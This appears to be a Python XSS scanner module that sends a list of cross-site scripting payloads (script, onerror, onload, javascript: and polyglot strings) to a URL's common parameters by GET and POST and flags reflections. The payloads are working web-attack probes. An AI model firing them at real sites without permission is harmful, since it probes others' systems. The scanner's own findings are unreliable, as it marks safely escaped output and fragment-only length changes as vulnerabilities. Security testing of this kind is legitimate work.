import requests
from urllib.parse import urlencode
import html

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert('xss')>",
    "javascript:alert(1)",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(1)//",
    "#<img src=x onerror=alert(1)>",
    "?q=<script>alert(1)</script>#",
    "'><script>alert(1)</script>",
    '"/><script>alert(1)</script>',
    "';alert(1);//",
    "';alert(1)//",
    "';alert(1)/*",
]

PARAMS = ["q", "query", "search", "s", "test", "data", "input", "term", "keyword"]

def scan_xss_basic(url: str):
    results = []
    
    for param in PARAMS:
        for payload in XSS_PAYLOADS:
            try:
                test_url = f"{url}?{urlencode({param: payload})}"
                resp = requests.get(test_url, timeout=8, allow_redirects=False)
                
                hash_url = f"{url}?{param}=test#{payload}"
                resp_hash = requests.get(hash_url, timeout=5, allow_redirects=False)
                
                post_url = url
                post_data = {param: payload}
                resp_post = requests.post(post_url, data=post_data, timeout=8, allow_redirects=False)
                
                reflected = (
                    payload in resp.text or
                    html.escape(payload) in resp.text or
                    payload in resp_hash.text or
                    payload in resp_post.text
                )
                
                hash_suspicious = len(resp_hash.text) != len(resp.text)
                
                results.append({
                    "param": param,
                    "payload": payload[:30] + "..." if len(payload)>30 else payload,
                    "url": test_url,
                    "reflected": reflected,
                    "hash_change": hash_suspicious,
                    "suspicious": reflected or hash_suspicious
                })
                
            except requests.RequestException as e:
                results.append({
                    "param": param,
                    "payload": payload,
                    "error": str(e),
                    "suspicious": False
                })
    
    return results

def scan_xss(url: str) -> bool:
    """WebSecAI wrapper"""
    print(f"🔍 XSS scan: {url}")
    results = scan_xss_basic(url)
    
    suspicious = [r for r in results if r.get("suspicious")]
    if suspicious:
        print(f"🟡 XSS found: {len(suspicious)} vectors!")
        for r in suspicious[:3]:
            print(f"  → {r['param']}={r['payload']}")
        return True
    
    print("🟢 XSS clean")
    return False
